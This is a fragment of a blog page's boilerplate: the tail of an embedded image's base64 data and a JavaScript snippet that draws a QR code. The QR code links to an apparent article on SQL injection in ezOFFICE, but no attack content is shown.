1EZJ3quqiOsTXdfMd9Ykw1kO4dfpeQUgtjGgtRJd3hORdG8IhqC5aL4fRB+H6IBy4flK/ney1/ZHlNN0fZGpdl0Py+tVXHEa/PogOI9qvI4w++7yC9tIrF9Uha8hFeKzDmIeR28f14JjfBqL5ws+ewNsDgUzVKfftQ/LqMOcw6vrtC4/z+mcIqYXgs56zHqVZV9f76Lq8ozXqkP2oz/DtgcyaXNr3ncDTn0NcyimL6jCfOkTvfuvUO/a8vKN1XS9uTixtH12Hca893/m+1+9cw7jevsf1hOxP4wTXh59DvBtE9wiZKgTVu69ziH+l2wfie8YhPgjqL4RRg5H3PVRNhTrEDyOW552A1Nu316708l1PSJ3CieIwEMh0IehenaqoDqMPRr7yqXeE1LsOjLz799yavVbXkB4wYuUqIHpd78N+MOZh5PuaV64h9RB0ncLDQF5peHn+3gls37L6EjWtiq5DpgrB8lRAePfLy7MPdUiduZUO8ZmfIcQDwe5xDbHn5V95lRF7HrIeBHVDOATVRftA8sD1u6zbyV7btyynJa72aV6ETLf7zXdd3vOQPl3X31HfDPWak4uQtSDYfRBd/7N89+kXzYsrvfLXZ0idwoli+wyB3BXwGvb38Gjq3Tvj1kPW1wMjVxcheUBpicDwz841wmMd5nn3bB8R5v5X8tcT4imdBLeBOO1nuNo3zO8K+63qXtVXfdQLey8Y91SeR9Hru7fnV9y638lvA1kVX/q/PYHDQCB3FYy42pZ3g6gPxnoIN98R5vne1zqIH46oR7QHxKsuwqjr73l1EcY6CIcR7WOdXFQvPAxE04WfOYFvH0hNucK3U9cVcpjfPebFqqmA0V/as+g95B0hvXu/7pND/HKx13euD1Ivn+G3D2S2yKW9fgJ/PBAYpw5z3u+azvuWYexjHqLDEfWIMHpcE6LrE2HUIdw6fR0hPnUYuboIYx7Cget3WbeTvQ5PiHdDx9W+9a3y6pC7oHMYdfP2FbveefnUOlauoutyyB7KU6Fe1xWQvDqMvDwVEL2uK/SLpe1jph8GounCz5zANhDIdOExrrYJqfMOeOYzr19UF2HeVz8kD19oToSvHBz/txauJUL8ctF+ojrM/TDqMPJeD1yfIbeTvbYn5GT7+r/dzv8AAAD//xRMgOwAAAAGSURBVAMAdtJ0v2a2Z58AAAAASUVORK5CYII=)

手机扫码阅读

编程


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 